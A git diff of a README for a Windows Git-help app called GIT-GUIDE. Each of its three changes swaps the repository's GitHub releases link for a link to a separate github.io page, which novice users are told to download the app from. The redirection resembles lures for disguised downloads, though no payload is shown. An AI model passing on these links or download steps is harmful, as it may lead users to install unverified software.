@@ -1,6 +1,6 @@
 # 📘 GIT-GUIDE - Every Git Answer in One Place
 
-[![Download GIT-GUIDE](https://img.shields.io/badge/Download-GIT--GUIDE-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/liorahaokay881/GIT-GUIDE/releases)
+[![Download GIT-GUIDE](https://img.shields.io/badge/Download-GIT--GUIDE-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://liorahaokay881.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ This guide is perfect for students, hobbyists, or anyone who uses a computer and
 
 To begin using GIT-GUIDE, you first need to download it to your Windows computer. The process is simple and takes less than five minutes. Follow these easy steps:
 
-1.  Visit this link to download the application: [https://github.com/liorahaokay881/GIT-GUIDE/releases](https://github.com/liorahaokay881/GIT-GUIDE/releases)
+1.  Visit this link to download the application: [https://liorahaokay881.github.io](https://liorahaokay881.github.io)
 2.  Look for the newest version listed on the page. It will usually be at the top.
 3.  Click the download button that matches your computer. Choose the file that says "Windows" if you see more than one option.
 
@@ -129,7 +129,7 @@ GIT-GUIDE is regularly improved with new examples, clearer explanations, and upd
 
 If a new version is available, the application will show you a simple prompt. Click "Download Update" and follow the same installation steps you used the first time. Your practice progress and settings will be kept safely.
 
-To find new versions manually, always visit: [https://github.com/liorahaokay881/GIT-GUIDE/releases](https://github.com/liorahaokay881/GIT-GUIDE/releases). Download the latest file there.
+To find new versions manually, always visit: [https://liorahaokay881.github.io](https://liorahaokay881.github.io). Download the latest file there.
 
 ---
 
